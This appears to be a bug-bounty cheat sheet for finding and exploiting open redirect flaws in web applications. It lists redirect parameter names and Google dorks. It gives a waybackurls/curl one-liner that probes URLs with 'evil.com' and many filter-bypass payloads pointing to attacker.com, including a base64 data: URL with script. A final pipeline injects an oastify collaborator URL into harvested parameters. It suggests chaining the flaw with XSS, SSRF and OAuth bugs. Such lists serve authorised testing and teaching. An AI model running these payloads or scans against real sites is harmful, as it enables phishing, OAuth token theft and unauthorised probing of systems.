try to chain this vulnerability with other bugs such as [[XSS]] in url, [[SSRF]], [[OAuth]].

### hunt for it
##### Look for Redirect Parameters and endpoints
login, logout pages
```bash
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl

"next", "url", "target", "rurl", "dest", "destination", "redir", "redirect_uri", "redirect_url", "redirect", "out", "view", "to", "image_url", "go", "return", "returnTo", "return_to", "checkout_url", "continue", "return_path"
```
##### Use Google Dorks to Find Additional Redirect Parameters
1. `inurl:<one_of_above_Parameters> site:target`
2. `inurl:%3Dhttp site:example.com` :=> `https://one.com/login?u=http://hex.com/settings`
3. `inurl:%3D%2F site:example.com` :=> `https://example.com/login?n=/dashboard`
4. waybackurls
```bash
waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```
###### Test for Referer-Based Open Redirects
> simply change your referer header in the request then see if u get redirected to that referer
### payloads && Bypassing Protection
> remember to encode & ? # / \ , sometimes u may need to double encode it
> `scheme://userinfo@hostname:port/path?query#fragment`
```bash
\/attacker.com 
\/\/attacker.com 
\\attacker.com 
//attacker.com 
https:attacker.com 
https;attacker.com 
https:\/\/attacker.com 
https:/\/\attacker.com
https://attacker.com\@example.com
https://example.com.attacker.com/example.com
http://attacker.com/example.com
https://example.com@attacker.com/example.com
//theirsite@attacker.com 
/\/attacker.com 
data:MEDIA_TYPE[;base64],DATA
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
https://yoursite.com%3F.theirsite.com/ 
https://yoursite.com%2F@theirsite.com/ 
https://yoursite.com%2523.theirsite.com/ 
https://yoursite?c=.theirsite.com/ (use # \ also) 
//%2F/yoursite.com 
////yoursite.com 
https://theirsite.computer/ 
https://theirsite.com.mysite.com 
/%0D/yoursite.com (Also try %09, %00, %0a, %07) 
/%2F/yoururl.com 
/%5Cyoururl.com 
//google%E3%80%82com
```
### one lines
```bash

Step 1: Subdomain Enumeration 
	•DNS Dumpster •Sublist3r •Amass •Google Dorking •Certificate Transparency Logs •subdomainer
Step 2: Find Live Domains 
	cat all-domains.txt | httpx > all-live.txt
Setp 2b: wayback machine: 
	cat all-live.txt | python3 waymore.py
Step 3: Identify All URLs
	cat all-live.txt | gauplus -o allUrls.txt
Step 4: Injection BurpCollaborator/Interactsh-Client URL in Parameters 
	cat /home/casperino/tools/nuclei/httpx.txt | grep "=" | ./qsreplace http://40ga7gynfy6pcg06ov.oastify.com > redirect.txt
Step 5: Test for open redirect Vulnerabilities 
	cat redirect.txt | httpx -fr
Step 6: How to check which URL is vulnerable 
	split -l 10 redirect.txt output_file_
```
u can try `queryswap` instead of `qsreplace`